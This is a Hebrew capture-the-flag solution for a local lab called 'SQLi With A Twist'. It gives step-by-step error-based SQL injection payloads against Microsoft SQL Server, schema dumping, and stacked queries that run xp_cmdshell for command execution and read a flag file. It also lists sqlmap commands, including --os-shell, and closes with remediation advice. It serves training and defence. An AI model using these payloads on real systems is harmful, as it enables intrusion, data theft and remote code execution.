# פתרון — SQLi With A Twist (ספוילרים)

> ⚠️ לשימוש חוקי, מקומי וחינוכי בלבד. להריץ רק מול המעבדה **שלך** על `localhost`.

**מטרה:** `GET http://localhost:8080/search?price=<PAYLOAD>` (תיבת החיפוש ב-`/inventory` פונה לאותו API).
**התפס:** הפרמטר `price` נכנס בתוך `LIKE '...'` עם גרשיים, אז כל payload נפתח ב-`'` ונסגר ב-`--`.
**הערוץ:** התשובה היא `text/plain` — מחירים תואמים כ-CSV בהצלחה, או **HTTP 500 עם שגיאת ה-SQL הגולמית** כש-`CONVERT` נכשל. השגיאה הזו היא ה-oracle לקריאה.

השאילתה בצד השרת:

```sql
SELECT TOP 100 price FROM dbo.products
WHERE active = 1 AND CAST(price AS varchar(30)) LIKE '<price>%'
```

---

### 1. זיהוי — גרש בודד שובר את המחרוזת:

```
?price=10'
```

← 500 `Unclosed quotation mark after the character string...` = פגיע להזרקה.

### 2. בוליאני — אותו עמוד, תוכן שונה (שניהם 200):

```
?price=' OR 1=1--      כל המחירים
?price=' OR 1=2--      ריק
```

### 3. מי אנחנו? — דוחפים מחרוזת דרך `CONVERT(int, …)`; ה-500 מדליף אותה:

```
?price=' OR 1=CONVERT(int,(SELECT IS_SRVROLEMEMBER('sysadmin')))--    ← 1  (אנחנו DBA)
?price=' OR 1=CONVERT(int,(SELECT @@version))--
?price=' OR 1=CONVERT(int,(SELECT DB_NAME()))--
```

### 4. מיפוי — `STRING_AGG` שופך רשימה שלמה בשגיאה אחת:

```
?price=' OR 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.databases))--
?price=' OR 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))--
?price=' OR 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('dbo.products')))--
```

### 5. הפיתיון 🪤 — הרשאת sysadmin מאפשרת מעבר ל-DB שני בשם `VaultDb` עם טבלת `Flag`. זו מלכודת:

```
?price=' OR 1=CONVERT(int,(SELECT TOP 1 note FROM VaultDb.dbo.Flag))--
```

← `Nice try but the flag will be found with more effort`. הדגל האמיתי לא נמצא ב-DB — צריך הרצת קוד.

### 6. הטוויסט: RCE — stacked queries מריצים `xp_cmdshell`; שומרים את הפלט בטבלה, ואז מדליפים אותו דרך אותו ערוץ שגיאה.

**6א. מריצים פקודה, לוכדים את הפלט:**

```
?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'whoami';--
```

← 200 (ריק). ברקע, `whoami` רץ והפלט שלו נמצא עכשיו ב-`dbo.rce_out`.

**6ב. מוציאים אותו החוצה:**

```
?price=' OR 1=CONVERT(int,(SELECT TOP 1 line FROM dbo.rce_out WHERE line IS NOT NULL ORDER BY id))--
```

← 500 מדליף `mssql`. זה הפלט של הפקודה. **זה RCE.**

### 7. תפיסת הדגל 🚩 — הדגל האמיתי הוא קובץ בתיקיית העבודה של SQL Server. מציגים אותה, ואז קוראים אותו.

```
# מציגים את התיקייה, ואז שופכים את כל שמות הקבצים בבת אחת ← תראה את Flag.txt
?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'ls';--
?price=' OR 1=CONVERT(int,(SELECT STRING_AGG(line,',') FROM dbo.rce_out WHERE line IS NOT NULL))--

# קוראים אותו
?price='; IF OBJECT_ID('dbo.rce_out') IS NOT NULL DROP TABLE dbo.rce_out; CREATE TABLE dbo.rce_out(id INT IDENTITY, line NVARCHAR(4000)); INSERT INTO dbo.rce_out(line) EXEC master..xp_cmdshell 'cat Flag.txt';--
?price=' OR 1=CONVERT(int,(SELECT TOP 1 line FROM dbo.rce_out WHERE line IS NOT NULL ORDER BY id))--
```

← `This Is The KfirVerse flag - Congrats :)` (אם `ls` מראה תיקייה אחרת, נסה `cat /var/opt/mssql/Flag.txt`).

---

### מסלול מהיר עם sqlmap

```bash
URL="http://localhost:8080/search?price=10"
sqlmap -u "$URL" -p price --batch --dbms=mssql --technique=E --is-dba --dbs
sqlmap -u "$URL" -p price --batch --dbms=mssql --os-shell        # RCE
```

### שורש הבעיה ← תיקון

- `price` משורשר לתוך ה-SQL ← **פרמטריזציה + ולידציה** (לדחות לא-מספרי).
- `SqlException` גולמי חוזר ללקוח ← **עמוד שגיאה גנרי**, לתעד בצד השרת.
- ה-login של האפליקציה הוא `sysadmin` ← **הרשאות מינימום** (רק `SELECT`).
- `xp_cmdshell` מופעל ← **לכבות אותו** (`sp_configure 'xp_cmdshell', 0; RECONFIGURE;`).

### הערות

- העמודה הנבחרת מספרית, אז מחרוזות חוזרות רק דרך ערוץ השגיאה (`CONVERT(int, …)`).
- לוגיקה בוליאנית משתמשת ב-`=`, לא ב-`-` (מקף יוצר `OR 0` שזורק שגיאה).
- אם `STRING_AGG` נחתך, לדפדף עם `TOP 1 … ORDER BY` + `WHERE name > '<last>'`.
- זהות ה-host: על Linux/Docker ה-`xp_cmdshell` רץ כ-**`mssql`**; על host אמיתי של Windows אותו שלב בדרך כלל נותן **`nt authority\system`**.
